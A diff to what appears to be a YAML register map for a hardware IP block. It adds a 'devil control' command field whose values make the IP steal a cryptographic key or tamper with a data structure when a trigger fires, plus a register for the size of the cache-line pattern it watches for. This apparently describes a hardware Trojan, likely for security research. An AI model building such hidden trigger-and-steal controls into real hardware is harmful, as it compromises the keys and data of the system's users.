@@ -88,6 +88,13 @@ register_blocks:
             0: Disables Transactions' Monitoring
             1: Enables Transactions' Monitoring
       - <<:
+        - { name:  CMD, bit_assignment:  { width: 4 }, type: rw  ,  initial_value: 0}
+        - comment: |
+            Send the command for the devil control to execute
+            0b0000: Upon an event/trigger detection, the IP will steal a cryptographic key.
+            0b0001: Upon an event/trigger detection, the IP will tamper with a data structure.
+            0bxxxx: Reserved
+      - <<:
         - { name:  Res, bit_assignment:  { width: 10 }, type: reserved}
 
 ################################################################           
@@ -649,6 +656,17 @@ register_blocks:
       comment: |
         Word X of the cache line pattern to be searched for
       offset_address: 0xBC
+      bit_fields:
+      - { name: data, bit_assignment:  { width: 32 }, type: wo  ,  initial_value: 0}
+
+################################################################
+## The size of the pattern in words, it could range from 1 word
+## up to 16 (i.e., cache line)
+################################################################
+    - name: pattern_size
+      comment: |
+        The size of the pattern in words, it could range from 1 word up to 16 (i.e., cache line)
+      offset_address: 0xC0
       bit_fields:
       - { name: data, bit_assignment:  { width: 32 }, type: wo  ,  initial_value: 0}
 
